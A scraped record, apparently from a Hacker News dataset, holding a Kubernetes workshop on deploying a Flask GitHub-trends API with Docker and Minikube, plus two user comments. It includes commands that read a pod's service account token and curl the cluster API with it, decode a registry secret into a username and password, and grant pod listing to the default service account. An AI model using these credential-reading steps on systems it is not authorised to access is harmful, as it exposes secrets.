ambassador-64d8b877f9-b68w6 1/1 Running 0 103m ambassador-64d8b877f9-vw9mm 1/1 Running 0 103m tgr-8d78d599f-pt5xx 1/1 Running 0 4m17s Now log inside the API Pod: kubectl exec -it tgr-8d78d599f-pt5xx bash Assign the token to a variable: KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) Notice that the token file is added automatically by Kubernetes. We also have other variables already set like: echo $KUBERNETES_SERVICE_HOST 10.96.0.1 echo $KUBERNETES_PORT_443_TCP_PORT 443 echo $HOSTNAME tgr-8d78d599f-pt5xx We are going to use these variables to access the list of Pods using this Curl command: curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods At this stage, you should have an error output saying that you don't have the rights to access this API endpoint, which is normal: { \"kind\": \"Status\", \"apiVersion\": \"v1\", \"metadata\": { }, \"status\": \"Failure\", \"message\": \"pods \\\"tgr-8d78d599f-pt5xx\\\" is forbidden: User \\\"system:serviceaccount:default:default\\\" cannot get resource \\\"pods\\\" in API group \\\"\\\" in the namespace \\\"default\\\"\", \"reason\": \"Forbidden\", \"details\": { \"name\": \"tgr-8d78d599f-pt5xx\", \"kind\": \"pods\" }, \"code\": 403 } The Pod is using the default Service Account and it does not have the right to list the Pods. In order to fix this, exit the container and create a file called kubernetes/service-account.yaml, add the following lines: kind: ClusterRole apiVersion: rbac.authorization.k8s.io/v1 metadata: name: pods-list rules: - apiGroups: [\"\"] resources: [\"pods\"] verbs: [\"list\"] --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: pods-list subjects: - kind: ServiceAccount name: default namespace: default roleRef: kind: ClusterRole name: pods-list apiGroup: rbac.authorization.k8s.io Then apply the new configuration using kubectl apply -f kubernetes/service-account.yaml. Now you can access the list of Pods: { \"kind\": \"PodList\", \"apiVersion\": \"v1\", \"metadata\": { \"selfLink\": \"/api/v1/namespaces/default/pods/\", \"resourceVersion\": \"19589\" }, \"items\": [ { \"metadata\": { \"name\": \"ambassador-64d8b877f9-4bzvn\", \"generateName\": \"ambassador-64d8b877f9-\", \"namespace\": \"default\", \"selfLink\": \"/api/v1/namespaces/default/pods/ambassador-64d8b877f9-4bzvn\", \"uid\": \"63f62ede-de77-441d-85f7-daf9cbc7040f\", \"resourceVersion\": \"1047\", \"creationTimestamp\": \"2019-08-19T08:12:47Z\", \"labels\": { \"pod-template-hash\": \"64d8b877f9\", \"service\": \"ambassador\" }, \"annotations\": { \"consul.hashicorp.com/connect-inject\": \"false\", \"sidecar.istio.io/inject\": \"false\" }, \"ownerReferences\": [ { \"apiVersion\": \"apps/v1\", \"kind\": \"ReplicaSet\", \"name\": \"ambassador-64d8b877f9\", \"uid\": \"383c2e4b-7179-4806-b7bf-3682c7873a10\", \"controller\": true, \"blockOwnerDeletion\": true } ] }, \"spec\": { \"volumes\": [ { \"name\": \"ambassador-token-rdqq6\", \"secret\": { \"secretName\": \"ambassador-token-rdqq6\", \"defaultMode\": 420 } } ], \"containers\": [ { \"name\": \"ambassador\", \"image\": \"quay.io/datawire/ambassador:0.75.0\", \"ports\": [ { \"name\": \"http\", \"containerPort\": 8080, \"protocol\": \"TCP\" }, ... What about creating your own monitoring/observability solution using Python (or any other programming language) and the Kubernetes API ? This could be probably the subject of the upcoming workshop. I'll add every contributor here. Thanks to: If this workshop solved some of your problems, please consider giving it a star and/or buying me a coffee: Use only for educational purposes. We don't provide any guarantee. ",
          "After having just spend most of the day yesterday trying to nurse a failing Kubernetes cluster back to health (taking down all of our production websites in the process), I’ve come to completely loathe it. It felt more like practicing medicine than engineering: try different actions to suppress symptoms, instead of figuring out a root cause to actually prevent this from happening again. While it is a pretty sweet system if it does run, I would strongly advice against anyone trying to manage their own cluster, as it is simply to complex to debug on your own, and there is preciously little information out there to help you",
          "This is yet another one of those \"introductory\" articles.<p>The whole field it seems everywhere is filled with \"introductory\" \"gentle\" books/articles, and then \"this is how you do reusable rocket science with x\".<p>Pro tip: to understand kubernetes in between, go read the manual pages of Linux networking and get a really good grip on iptables. Go read the manual pages for linux namespaces, cgroups and containers with lxc.<p>Why dont people get the basics of the parts of the tool they are going to use, first, instead of trying to \"understand a tool\"? You wont succeed doing anything with kubernetes, if you come from say macosx or windows envrionment, and have no clue how/what kubernetes is built on."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/eon01/kubernetes-workshop",
        "comments.comment_id": [21023917, 21024120],
        "comments.comment_author": ["Apocalypse_666", "antocv"],
        "comments.comment_descendants": [6, 4],
        "comments.comment_time": [
          "2019-09-20T07:04:48Z",
          "2019-09-20T07:41:52Z"
        ],
        "comments.comment_text": [
          "After having just spend most of the day yesterday trying to nurse a failing Kubernetes cluster back to health (taking down all of our production websites in the process), I’ve come to completely loathe it. It felt more like practicing medicine than engineering: try different actions to suppress symptoms, instead of figuring out a root cause to actually prevent this from happening again. While it is a pretty sweet system if it does run, I would strongly advice against anyone trying to manage their own cluster, as it is simply to complex to debug on your own, and there is preciously little information out there to help you",
          "This is yet another one of those \"introductory\" articles.<p>The whole field it seems everywhere is filled with \"introductory\" \"gentle\" books/articles, and then \"this is how you do reusable rocket science with x\".<p>Pro tip: to understand kubernetes in between, go read the manual pages of Linux networking and get a really good grip on iptables. Go read the manual pages for linux namespaces, cgroups and containers with lxc.<p>Why dont people get the basics of the parts of the tool they are going to use, first, instead of trying to \"understand a tool\"? You wont succeed doing anything with kubernetes, if you come from say macosx or windows envrionment, and have no clue how/what kubernetes is built on."
        ],
        "id": "6abe8b69-0af3-42c8-ab5b-6a32dccf5264",
        "url_text": "Slides available here. Original article posted here. Source code here. Inspired from my course: Learn Kubernetes by building 10 projects Introduction In this workshop, we're going to: Deploy Kubernetes services and an Ambassador API gateway. Examine the difference between Kubernetes proxies and service mesh like Istio. Access the Kubernetes API from the outside and from a Pod. Understand what API to choose. See how Service Accounts and RBAC works Discover some security pitfalls when building Docker images and many interesting things. Other things :-) We will start by developing then deploying a simple Python application (a Flask API that returns the list of trending repositories by programming language). Development Environment We are going to use Python 3.6.7 We are using Ubuntu 18.04 that comes with Python 3.6 by default. You should be able to invoke it with the command python3. (Ubuntu 17.10 and above also come with Python 3.6.7) If you use Ubuntu 16.10 and 17.04, you should be able to install it with the following commands: sudo apt-get update sudo apt-get install python3.6 If you are using Ubuntu 14.04 or 16.04, you need to get Python 3 from a Personal Package Archive (PPA): sudo add-apt-repository ppa:deadsnakes/ppa sudo apt-get update sudo apt-get install python3.6 For the other operating systems, visit this guide, follow the instructions and install Python3. Now install PIP, the package manager: sudo apt-get install python3-pip Follow this by the installation of Virtualenvwrapper, which is a virtual environment manager: sudo pip3 install virtualenvwrapper Create a folder for your virtualenvs (I use ~/dev/PYTHON_ENVS) and set it as WORKON_HOME: mkdir ~/dev/PYTHON_ENVS export WORKON_HOME=~/dev/PYTHON_ENVS In order to source the environment details when the user login, add the following lines to ~/.bashrc: source \"/usr/local/bin/virtualenvwrapper.sh\" export WORKON_HOME=\"~/dev/PYTHON_ENVS\" Make sure to adapt the WORKON_HOME to your real WORKON_HOME. Now we need to create then activate the new environment: mkvirtualenv --python=/usr/bin/python3 trendinggitrepositories workon trendinggitrepositories Let's create the application directories: mkdir trendinggitrepositories cd trendinggitrepositories mkdir api cd api Once the virtual environment is activated, we can install Flask: Developing a Trending Git Repositories API (Flask) Inside the API folder api, create a file called app.py and add the following code: from flask import Flask app = Flask(__name__) @app.route('/') def index(): return \"Hello, World!\" if __name__ == '__main__': app.run(debug=True) This will return a hello world message when a user requests the \"/\" route. Now run it using: python app.py and you will see a similar output to the following one: * Serving Flask app \"api\" (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: on * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit) * Restarting with stat * Debugger is active! * Debugger PIN: 465-052-587 We now need to install PyGithub since we need it to communicate with Github API v3. Go to Github and create a new app. We will need the application \"Client ID\" and \"Client Secret\": from github import Github g = Github(\"xxxxxxxxxxxxx\", \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\") This is how the mini API looks like: from flask import Flask, jsonify, abort import urllib.request, json from flask import request app = Flask(__name__) from github import Github g = Github(\"xxxxxx\", \"xxxxxxxxxxxxx\") @app.route('/') def get_repos(): r = [] try: args = request.args n = int(args['n']) except (ValueError, LookupError) as e: abort(jsonify(error=\"No integer provided for argument 'n' in the URL\")) repositories = g.search_repositories(query='language:python')[:n] for repo in repositories: with urllib.request.urlopen(repo.url) as url: data = json.loads(url.read().decode()) r.append(data) return jsonify({'repos':r }) if __name__ == '__main__': app.run(debug=True) Let's hide the Github token and secret as well as other variables in the environment. from flask import Flask, jsonify, abort, request import urllib.request, json, os from github import Github app = Flask(__name__) CLIENT_ID = os.environ['CLIENT_ID'] CLIENT_SECRET = os.environ['CLIENT_SECRET'] DEBUG = os.environ['DEBUG'] g = Github(CLIENT_ID, CLIENT_SECRET) @app.route('/') def get_repos(): r = [] try: args = request.args n = int(args['n']) except (ValueError, LookupError) as e: abort(jsonify(error=\"No integer provided for argument 'n' in the URL\")) repositories = g.search_repositories(query='language:python')[:n] for repo in repositories: with urllib.request.urlopen(repo.url) as url: data = json.loads(url.read().decode()) r.append(data) return jsonify({'repos':r }) if __name__ == '__main__': app.run(debug=DEBUG) The code above will return the top \"n\" repositories using Python as a programming language. We can use other languages too: from flask import Flask, jsonify, abort, request import urllib.request, json, os from github import Github app = Flask(__name__) CLIENT_ID = os.environ['CLIENT_ID'] CLIENT_SECRET = os.environ['CLIENT_SECRET'] DEBUG = os.environ['DEBUG'] g = Github(CLIENT_ID, CLIENT_SECRET) @app.route('/') def get_repos(): r = [] try: args = request.args n = int(args['n']) l = args['l'] except (ValueError, LookupError) as e: abort(jsonify(error=\"Please provide 'n' and 'l' parameters\")) repositories = g.search_repositories(query='language:' + l)[:n] try: for repo in repositories: with urllib.request.urlopen(repo.url) as url: data = json.loads(url.read().decode()) r.append(data) return jsonify({ 'repos':r, 'status': 'ok' }) except IndexError as e: return jsonify({ 'repos':r, 'status': 'ko' }) if __name__ == '__main__': app.run(debug=DEBUG) In a .env file, add the variables you want to use: CLIENT_ID=\"xxxxx\" CLIENT_SECRET=\"xxxxxx\" ENV=\"dev\" DEBUG=\"True\" Before running the Flask application, you need to source these variables: Now, you can go to http://0.0.0.0:5000/?n=1&l=python to get the trendiest Python repository or http://0.0.0.0:5000/?n=1&l=c for C programming language. Here is a list of other programming languages you can test your code with: C++ Assembly Objective Makefile Shell Perl Python Roff Yacc Lex Awk UnrealScript Gherkin M4 Clojure XS Perl sed The list is long, but our mini API is working fine. Now, let's freeze the dependencies: pip freeze > requirements.txt Before running the API on Kubernetes, let's create a Dockerfile. This is a typical Dockerfile for a Python app: FROM python:3 ENV PYTHONUNBUFFERED 1 RUN mkdir /app WORKDIR /app COPY requirements.txt /app RUN pip install --upgrade pip RUN pip install -r requirements.txt COPY . /app EXPOSE 5000 CMD [ \"python\", \"app.py\" ] Now you can build it: docker build --no-cache -t tgr . Then run it: docker rm -f tgr docker run -it --name tgr -p 5000:5000 -e CLIENT_ID=\"xxxxxxx\" -e CLIENT_SECRET=\"xxxxxxxxxxxxxxx\" -e DEBUG=\"True\" tgr Let's include some other variables as environment variables: from flask import Flask, jsonify, abort, request import urllib.request, json, os from github import Github app = Flask(__name__) CLIENT_ID = os.environ['CLIENT_ID'] CLIENT_SECRET = os.environ['CLIENT_SECRET'] DEBUG = os.environ['DEBUG'] HOST = os.environ['HOST'] PORT = os.environ['PORT'] g = Github(CLIENT_ID, CLIENT_SECRET) @app.route('/') def get_repos(): r = [] try: args = request.args n = int(args['n']) l = args['l'] except (ValueError, LookupError) as e: abort(jsonify(error=\"Please provide 'n' and 'l' parameters\")) repositories = g.search_repositories(query='language:' + l)[:n] try: for repo in repositories: with urllib.request.urlopen(repo.url) as url: data = json.loads(url.read().decode()) r.append(data) return jsonify({ 'repos':r, 'status': 'ok' }) except IndexError as e: return jsonify({ 'repos':r, 'status': 'ko' }) if __name__ == '__main__': app.run(debug=DEBUG, host=HOST, port=PORT) For security reasons, let's change the user inside the container from root to a user with less rights that we create: FROM python:3 ENV PYTHONUNBUFFERED 1 RUN adduser pyuser RUN mkdir /app WORKDIR /app COPY requirements.txt /app RUN pip install --upgrade pip RUN pip install -r requirements.txt COPY . . RUN chmod +x app.py RUN chown -R pyuser:pyuser /app USER pyuser EXPOSE 5000 CMD [\"python\",\"./app.py\"] Now if we want to run the container, we need to add many environment variables to the docker run command. An easier solution is using --env-file with Docker run: docker run -it --env-file .env my_container Our .env file looks like the following one: CLIENT_ID=\"xxxx\" CLIENT_SECRET=\"xxxx\" ENV=\"dev\" DEBUG=\"True\" HOST=\"0.0.0.0\" PORT=5000 After this modification, rebuild the image docker build -t tgr . and run it using: docker rm -f tgr; docker run -it --name tgr -p 5000:5000 --env-file .env tgr Our application runs using python app.py which is the webserver that ships with Flask and it's great for development and local execution of your program, however, it's not designed to run in a production mode, whether it's a monolithic app or a microservice. A production server typically receives abuse from spammers, script kiddies, and should be able to handle high traffic. In our case, a good solution is using a WSGI HTTP server like Gunicorn (or uWsgi). First, let's install gunicorn with the following command: pip install gunicorn. This will require us to update our requirements.txt with pip freeze > requirements.txt This is why we are going to change our Docker file: FROM python:3 ENV PYTHONUNBUFFERED 1 RUN adduser pyuser RUN mkdir /app WORKDIR /app COPY requirements.txt /app RUN pip install --upgrade pip RUN pip install -r requirements.txt COPY . . RUN chmod +x app.py RUN chown -R pyuser:pyuser /app USER pyuser EXPOSE 5000 CMD [\"gunicorn\", \"app:app\", \"-b\", \"0.0.0.0:5000\"] In order to optimize the Wsgi server, we need to set the number of its workers and threads to: workers = multiprocessing.cpu_count() * 2 + 1 threads = 2 * multiprocessing.cpu_count() This is why we are going to create another Python configuration file (config.py): import multiprocessing workers = multiprocessing.cpu_count() * 2 + 1 threads = 2 * multiprocessing.cpu_count() In the same file, we are going to include other configurations of Gunicorn: from os import environ as env bind = env.get(\"HOST\",\"0.0.0.0\") +\":\"+ env.get(\"PORT\", 5000) This is the final config.py file: import multiprocessing workers = multiprocessing.cpu_count() * 2 + 1 threads = 2 * multiprocessing.cpu_count() from os import environ as env bind = env.get(\"HOST\",\"0.0.0.0\") +\":\"+ env.get(\"PORT\", 5000) In consequence, we should adapt the Dockerfile to the new Gunicorn configuration by changing the last line to : CMD [\"gunicorn\", \"app:app\", \"--config=config.py\"] Now, build docker build -t tgr . and run docker run -it --env-file .env -p 5000:5000 tgr. Pushing the Image to a Remote Registry A Docker registry is a storage and distribution system for named Docker images. The images we built are stored in our local environment and can only be used if you deploy locally. However, if you choose to deploy a Kubernetes cluster in a cloud or any different environment, these images will be not found. This is why we need to push the build images to a remote registry. Think of container registries as a git system for Docker images. There are plenty of containers registries: Dockerhub Amazon Elastic Registry (ECR) Azure Container Registry (ACR) Google Container Registry (GCR) CoreOS Quay You can also host your private container registry that supports OAuth, LDAP and Active Directory authentication using the registry provided by Docker: docker run -d -p 5000:5000 --restart=always --name registry registry:2 More about self-hosting a registry can be found in the official Docker documentation. We are going to use Dockerhub; this is why you need to create an account on hub.docker.com. Now, using Docker CLI, login: Now rebuild the image using the new tag: docker build -t <username>/<image_name>:<tag_version> . Example: docker build -t eon01/tgr:1 . Finally, push the image: A Security Notice Many of the publicly (and even private Docker images) seems to be secure, but it's not the case. When we built our image, we told Docker to copy all the images from the application folder to the image and we push it to an external public registry. Or The above commands will even copy the .env file containing our secrets. A good solution is to tell Docker to ignore these files during the build using a .dockerignore file: **.git **.gitignore **README.md **env.* **Dockerfile* **docker-compose* **.env At this stage, you should remove any image that you pushed to a distant registry, reset the Github tokens, build the new image without any cache: docker build -t eon01/tgr:1 . --no-cache Push it again: Installing Minikube One of the fastest ways to try Kubernetes is using Minkube, which will create a virtual machine for you and deploy a ready-to-use Kubernetes cluster. Before you begin the installation, you need to make sure that your laptop supports virtualization: If your using Linux, run the following command and make sure that the output is not empty: grep -E --color 'vmx|svm' /proc/cpuinfo Mac users should execute: sysctl -a | grep -E --color 'machdep.cpu.features|VMX' If you see VMX in the output, the VT-x feature is enabled in your machine. Windows users should use systeminfo and you should see the following output: Hyper-V Requirements: VM Monitor Mode Extensions: Yes Virtualization Enabled In Firmware: Yes Second Level Address Translation: Yes Data Execution Prevention Available: Yes If everything is okay, you need to install a hypervisor. You have a list of possibilities here: KVM VirtualBox HyperKit VMware Fusion Hyper-V Some of these hypervisors are only compatible with some OSs like Hyper-V (formerly known as Windows Server Virtualization) for windows. VirtualBox is however cross-platform, and this is why we are going to use it here. Make sure to follow the instructions to install it. Now, install Minikube. Linux systems: curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 && chmod +x minikube sudo install minikube /usr/local/bin MacOs: brew cask install minikube curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-darwin-amd64 && chmod +x minikube sudo mv minikube /usr/local/bin Windows: Use Chocolatey as an administrator: Or use the installer binary. Minikube does not support all Kubernetes features (like load balancing for example), however, you can find the most important features there: Minikube supports the following Kubernetes features: DNS NodePorts ConfigMaps and Secrets Dashboards Container Runtime: Docker, rkt, CRI-O, and containerd Enabling CNI (Container Network Interface) Ingress You can also add different addons like: addon-manager dashboard default-storageclass efk freshpod gvisor heapster ingress logviewer metrics-server nvidia-driver-installer nvidia-gpu-device-plugin registry registry-creds storage-provisioner storage-provisioner-gluster If you run minikube start a cluster called minikube will be created; however, you have other choices rather than just creating a regular Minikube cluster. In this example, we are going to create a cluster called \"workshop\", enable a UI to browse the API and activate tailing logs: minikube start -p workshop --extra-config=apiserver.enable-swagger-ui=true --alsologtostderr You have plenty of other options to start a Minikube cluster; you can, for instance, choose the Kubernetes version and the VM driver: minikube start --kubernetes-version=\"v1.12.0\" --vm-driver=\"virtualbox\" Start the new cluster: minikube start -p workshop --extra-config=apiserver.enable-swagger-ui=true --alsologtostderr You can get detailed information about the cluster using: If you didn't install kubectl, follow the official instructions. You can open the dashboard using minikube -p workshop dashboard Deploying to Kubernetes We have three main ways to deploy our container to Kubernetes and scale it to N replica. The first one is the original form of replication in Kubernetes, and it's called Replication Controller. Even if Replica Sets replace it, it's still used in some codes. This is a typical example: apiVersion: v1 kind: ReplicationController metadata: name: app spec: replicas: 3 selector: app: app template: metadata: name: app labels: app: app spec: containers: - name: tgr image: reg/app:v1 ports: - containerPort: 80 We can also use Replica Sets, another way to deploy an app and replicate it: apiVersion: extensions/v1beta1 kind: ReplicaSet metadata: name: app spec: replicas: 3 selector: matchLabels: app: app template: metadata: labels: app: app environment: dev spec: containers: - name: app image: reg/app:v1 ports: - containerPort: 80 Replica Set and Replication Controller do almost the same thing. They ensure that you have a specified number of pod replicas running at any given time in your cluster. There are however, some differences. As you may notice, we are using matchLabels instead of label. Replica Set use Set-Based selectors while replication controllers use Equity-Based selectors. Selectors match Kubernetes objects (like pods) using the constraints of the specified label, and we are going to see an example in a Deployment specification file. Label selectors with equality-based requirements use three operators:=,== and !=. environment = production tier != frontend app == my_app (similar to app = my_app) In the last example, we used this notation: ... spec: replicas: 3 selector: matchLabels: app: app template: metadata: ... We could have used set-based requirements: ... spec: replicas: 3 selector: matchExpressions: - {key: app, operator: In, values: [app]} template: metadata: ... If we have more than 1 value for the app key, we can use: ... spec: replicas: 3 selector: matchExpressions: - {key: app, operator: In, values: [app, my_app, myapp, application]} template: metadata: ... And if we have other keys, we can use them like in the following example: ... spec: replicas: 3 selector: matchExpressions: - {key: app, operator: In, values: [app]} - {key: tier, operator: NotIn, values: [frontend]} - {key: environment, operator: NotIn, values: [production]} template: metadata: ... Newer Kubernetes resources such as Jobs, Deployments, ReplicaSets, and DaemonSets all support set-based requirements as well. This is an example of how we use Kubectl with selectors : kubectl delete pods -l 'env in (production, staging, testing)' Until now, we have seen that the Replication Controller and Replica Set are two ways to deploy our container and manage it in a Kubernetes cluster. However, the recommended approach is using a Deployment that configures a ReplicaSet. It is rather unlikely that we will ever need to create Pods directly for a production use-case since Deployments manages to create Pods for us through ReplicaSets. This is a simple Pod definition: apiVersion: v1 kind: Pod metadata: name: infinite labels: env: production owner: eon01 spec: containers: - name: infinite image: eon01/infinite In practice, we need: A Deployment object : Containers are specified here. A Service object: An abstract way to expose an application running on a set of Pods as a network service. This is a Deployment object that creates three replicas of the container app running the image \"reg/app:v1\". These containers can be reached using port 80: apiVersion: extensions/v1beta1 kind: Deployment metadata: name: app spec: replicas: 3 template: metadata: labels: app: app spec: containers: - name: app image: reg/app:v1 ports: - containerPort: 80 This is the Deployment file we will use (save it to kubernetes/api-deployment.yaml: apiVersion: apps/v1 kind: Deployment metadata: name: tgr labels: name: tgr spec: replicas: 1 selector: matchLabels: name: tgr template: metadata: name: tgr labels: name: tgr spec: containers: - name: tgr image: eon01/tgr:1 ports: - containerPort: 5000 resources: requests: memory: 128Mi limits: memory: 256Mi env: - name: CLIENT_ID value: \"xxxx\" - name: CLIENT_SECRET value: \"xxxxxxxxxxxxxxxxxxxxx\" - name: ENV value: \"prod\" - name: DEBUG value: \"False\" - name: HOST value: \"0.0.0.0\" - name: PORT value: \"5000\" Let's first talk about the API version; in the first example, we used the extensions/v1beta1 and in the second one, we used apps/v1. You may know that Kubernetes project development is very active, and it may be confusing sometimes to follow all the software updates. In Kubernetes version 1.9, apps/v1 is introduced, and extensions/v1beta1, apps/v1beta1 and apps/v1beta2 are deprecated. To make things simpler, to know which version of the API you need to use, use the command: This above command will give you the API versions compatible with your cluster. v1 was the first stable release of the Kubernetes API. It contains many core objects. apps/v1 is the most popular API group in Kubernetes, and it includes functionality related to running applications on Kubernetes, like Deployments, RollingUpdates, and ReplicaSets. autoscaling/v1 allows pods to be autoscaled based on different resource usage metrics. batch/v1 is related to batch processing and and jobs batch/v1beta1 is the beta release of batch/v1 certificates.k8s.io/v1beta1 validates network certificates for secure communication in your cluster. extensions/v1beta1 includes many new, commonly used features. In Kubernetes 1.6, some of these features were relocated from extensions to specific API groups like apps . policy/v1beta1 enables setting a pod disruption budget and new pod security rules rbac.authorization.k8s.io/v1 includes extra functionality for Kubernetes RBAC (role-based access control) ..etc Let's deploy the pod now using the Deployment file we created. kubectl apply -f kubernetes/api-deployment.yaml Note that you can use kubectl create -f kubernetes/api-deployment.yaml command. However, there's a difference, between apply and create. kubectl create is what we call Imperative Management of Kubernetes Objects Using Configuration Files. kubectl create overwrites all changes, and if a resource is having the same id already exists, it will encounter an error. Using this approach, you tell the Kubernetes API what you want to create, replace, or delete, not how you want your K8s cluster world to look like. kubectl apply is what we call Declarative Management of Kubernetes Objects Using Configuration Files approach. kubectl apply makes incremental changes. If an object already exists and you want to apply a new value for replica without deleting and recreating the object again, then kubectl apply is what you need. kubectl apply can also be used even if the object (e.g deployment) does not exist yet. In the Deployment configuration, we also defined our container. We will run a single container here since the replica is set to 1. In the same time, our container will use the image eon01/tgr:1. Since our container will need some environment variables, the best way is to provide them using the Kubernetes deployment definition file. Also, we can add many other configurations, like the requested memory and its limit. The goal here is not using all that Kubernetes allows is to use in a Deployment file, but to see some of the essential features. spec: containers: - name: tgr image: eon01/tgr:1 ports: - containerPort: 5000 resources: requests: memory: 128Mi limits: memory: 256Mi env: - name: CLIENT_ID value: \"xxxx\" - name: CLIENT_SECRET value: \"xxxxxxxxxxxxxxxxxxxxx\" - name: ENV value: \"prod\" - name: DEBUG value: \"False\" - name: HOST value: \"0.0.0.0\" - name: PORT value: \"5000\" In some cases, the Docker registry can be private, and in this case, pulling the image needs authentication. In this case, we need to add the imagePullSecrets configuration: ... containers: - name: private-reg-container image: <your-private-image> imagePullSecrets: - name: registry-credentials ... This is how the registry-credentials secret is created: kubectl create secret docker-registry registry-credentials --docker-server=<your-registry-server> --docker-username=<your-name> --docker-password=<your-pword> --docker-email=<your-email> You can also apply/create the registry-credentials using a YAML file. This is an example: apiVersion: v1 kind: Secret metadata: ... name: registry-credentials ... data: .dockerconfigjson: adjAalkazArrA ... JHJH1QUIIAAX0= type: kubernetes.io/dockerconfigjson If you decode the .dockerconfigjson file using base64 --decode command, you will understand that it's a simple file storing the configuration to access a registry: kubectl get secret regcred --output=\"jsonpath={.data.\\.dockerconfigjson}\" | base64 --decode You will get a similar output to the following one: {\"auths\":{\"your.private.registry.domain.com\":{\"username\":\"eon01\",\"password\":\"xxxxxxxxxxx\",\"email\":\"aymen@eralabs.io\",\"auth\":\"dE3xxxxxxxxx\"}}} Again, let's decode the \"auth\" value using echo \"dE3xxxxxxxxx\"|base64 --decode and it will give you something like eon01:xxxxxxxx which has the format username:password. Now let's see if the deployment is done, let's see how many pods we have: This command will show all the pods within a cluster. We can scale our deployment using a command similar to the following one: kubectl scale --replicas=<expected_replica_num> deployment <deployment_name> Our deployment is called tgr since it's the name we gave to it in the Deployment configuration. You can also make verification by typing kubectl get deployment. Let's scale it: kubectl scale --replicas=2 deployment tgr Each of these containers will be accessible on port 500 from outside the container but not from outside the cluster. The number of pods/containers running for our API can be variable and may change dynamically. We can set up a load balancer that will balance traffic between the two pods we created, but since each pod can disappear to be recreated, its hostname and address will change. In all cases, pods are not meant to receive traffic directly, but they need to be exposed to traffic using a Service. In other words, the set of Pods running in one moment in time could be different from the set of Pods running that application a moment later. At the moment, the only service running is the cluster IP (which is related to Minikube and give us access to the cluster we created): Services In Kubernetes, since Pods are mortals, we should create an abstraction that defines a logical set of Pods and how to access them. This is the role of Services. In our case, creating a load balancer is a suitable solution. This is the configuration file of a Service object that will listen on the port 80 and load-balance traffic to the Pod with the label nameequals to app . The latter is accessible internally using the port 5000 like it's defined in the Deployment configuration: ... ports: - containerPort: 5000 ... This is how the Service looks like: apiVersion: v1 kind: Service metadata: name: lb labels: name: lb spec: ports: - port: 80 targetPort: 5000 selector: name: tgr type: LoadBalancer Save this file to kubernetes/api-service.yaml and deploy it using kubectl apply -f kubernetes/api-service.yaml. If you type kubectl get service, you will get the list of Services running in our local cluster: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.96.0.1 <none> 443/TCP 51m lb LoadBalancer 10.99.147.117 <pending> 80:30546/TCP 21s Not that the ClusterIP does not have an external IP while the app Service external IP is pending. No need to wait for the external IP of the created service, since Minikube does not really deploy a load balancer and this feature will only work if you configure a Load Balancer provider. If you are using a Cloud provider, say AWS, an AWS load balancer will be set up for you, GKE will provide a Cloud Load Balancer..etc You may also configure other types of load balancers. There are different types of Services that we can use to expose access to the API publicly: ClusterIP: is the default Kubernetes service. It exposes the Service on a cluster-internal IP. You can access it using the Kubernetes proxy. Illustration by Ahmet Alp Balkan via Medium. NodePort: Exposes the Service on each Nodes (VM's) IP at a static port called the NodePort. (In our example, we have a single node). This is a primitive way to make an application accessible from outside the cluster and is not suitable for many use cases since your nodes (VMs) IP addresses may change at any time. The service is accessible using <NodeIP>:<NodePort>. Illustration by Ahmet Alp Balkan via Medium. LoadBalancer: This is more advanced than a NodePort Service. Usually, a Load Balancer exposes a Service externally using a cloud providers load balancer. NodePort and ClusterIP Services, to which the external load balancer routes, are automatically created. Illustration by Ahmet Alp Balkan via Medium. We created a Load Balancer using a Service on our Minikube cluster, but since we don't have a Load Balancer to run, we can access the API service using the Cluster IP followed by the Service internal Port: Output: Now execute kubectl get services : NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.96.0.1 <none> 443/TCP 51m lb LoadBalancer 10.99.147.117 <pending> 80:30546/TCP 21s Use the IP 192.168.99.199 followed by the port 30546 to access the API. You can test this using a curl command: curl \"http://192.168.99.100:30546/?l=python&n=1\" --- {\"repos\":[{\"archive_url\":\"https://api.github.com/repos/vinta/awesome-python/{archive_format}{/ref}\",\"archived\":false,\"assignees_url\":\"https://api.github.com/repos/vinta/awesome-python/assignees{/user}\",\"blobs_url\":\"https://api.github.com/repos/vinta/awesome-python/git/blobs{/sha}\",\"branches_url\":\"https://api.github.com/repos/vinta/awesome-python/branches{/branch}\",\"clone_url\":\"https://github.com/vinta/awesome-python.git\",\"collaborators_url\":\"https://api.github.com/repos/vinta/awesome-python/collaborators{/collaborator}\",\"comments_url\":\"https://api.github.com/repos/vinta/awesome-python/comments{/number}\",\"commits_url\":\"https://api.github.com/repos/vinta/awesome-python/commits{/sha}\",\"compare_url\":\"https://api.github.com/repos/vinta/awesome-python/compare/{base}...{head}\",\"contents_url\":\"https://api.github.com/repos/vinta/awesome-python/contents/{+path}\",\"contributors_url\":\"https://api.github.com/repos/vinta/awesome-python/contributors\",\"created_at\":\"2014-06-27T21:00:06Z\",\"default_branch\":\"master\",\"deployments_url\":\"https://api.github.com/repos/vinta/awesome-python/deployments\",\"description\":\"A curated list of awesome Python frameworks, libraries, software and 